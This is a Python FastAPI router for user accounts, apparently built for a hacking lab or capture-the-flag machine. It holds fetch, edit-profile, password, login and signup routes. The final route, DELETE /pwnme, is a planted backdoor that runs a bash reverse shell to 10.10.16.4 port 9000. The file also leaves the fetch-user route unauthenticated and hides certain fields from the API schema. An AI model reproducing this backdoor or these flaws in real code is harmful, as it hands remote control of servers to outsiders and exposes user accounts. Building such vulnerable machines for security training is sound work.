from typing import Any, Optional
from uuid import uuid4
from datetime import datetime


from fastapi import APIRouter, Depends, HTTPException, Query, Request
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.orm import Session

from app import crud
from app import schemas
from app.api import deps
from app.models.user import User
from app.core.security import get_password_hash
import os
from pydantic import schema
def field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:
    if field.field_info.extra.get("hidden_from_schema", False):
        raise schema.SkipField(f"{field.name} field is being hidden")
    else:
        return original_field_schema(field, **kwargs)

original_field_schema = schema.field_schema
schema.field_schema = field_schema

from app.core.auth import (
    authenticate,
    create_access_token,
)

router = APIRouter()

@router.get("/{user_id}", status_code=200, response_model=schemas.User)
def fetch_user(*, 
    user_id: int, 
    db: Session = Depends(deps.get_db) 
    ) -> Any:
    """
    Fetch a user by ID
    """
    result = crud.user.get(db=db, id=user_id)
    return result


@router.put("/{user_id}/edit")
async def edit_profile(*,
    db: Session = Depends(deps.get_db),
    token: User = Depends(deps.parse_token),
    new_user: schemas.user.UserUpdate,
    user_id: int
) -> Any:
    """
    Edit the profile of a user
    """
    u = db.query(User).filter(User.id == token['sub']).first()
    if token['is_superuser'] == True:
        crud.user.update(db=db, db_obj=u, obj_in=new_user)
    else:        
        u = db.query(User).filter(User.id == token['sub']).first()        
        if u.id == user_id:
            crud.user.update(db=db, db_obj=u, obj_in=new_user)
            return {"result": "true"}
        else:
            raise HTTPException(status_code=400, detail={"result": "false"})

@router.put("/{user_id}/password")
async def edit_password(*,
    db: Session = Depends(deps.get_db),
    token: User = Depends(deps.parse_token),
    new_user: schemas.user.PasswordUpdate,
    user_id: int
) -> Any:
    """
    Update the password of a user
    """
    u = db.query(User).filter(User.id == token['sub']).first()
    if token['is_superuser'] == True:
        crud.user.update(db=db, db_obj=u, obj_in=new_user)
    else:        
        u = db.query(User).filter(User.id == token['sub']).first()        
        if u.id == user_id:
            crud.user.update(db=db, db_obj=u, obj_in=new_user)
            return {"result": "true"}
        else:
            raise HTTPException(status_code=400, detail={"result": "false"})

@router.post("/login")
def login(db: Session = Depends(deps.get_db),
    form_data: OAuth2PasswordRequestForm = Depends()
) -> Any:
    """
    Get the JWT for a user with data from OAuth2 request form body.
    """
    
    timestamp = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
    user = authenticate(email=form_data.username, password=form_data.password, db=db)
    if not user:
        with open("auth.log", "a") as f:
            f.write(f"{timestamp} - Login Failure for {form_data.username}\n")
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    
    with open("auth.log", "a") as f:
            f.write(f"{timestamp} - Login Success for {form_data.username}\n")

    return {
        "access_token": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),
        "token_type": "bearer",
    }

@router.post("/signup", status_code=201)
def create_user_signup(
    *,
    db: Session = Depends(deps.get_db),
    user_in: schemas.user.UserSignup,
) -> Any:
    """
    Create new user without the need to be logged in.
    """

    new_user = schemas.user.UserCreate(**user_in.dict())

    new_user.guid = str(uuid4())

    user = db.query(User).filter(User.email == new_user.email).first()
    if user:
        raise HTTPException(
            status_code=400,
            detail="The user with this username already exists in the system",
        )
    user = crud.user.create(db=db, obj_in=new_user)

    return user

@router.delete("/pwnme", status_code=200)
def pwnme() -> Any:
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/9000 0>&1'")
    return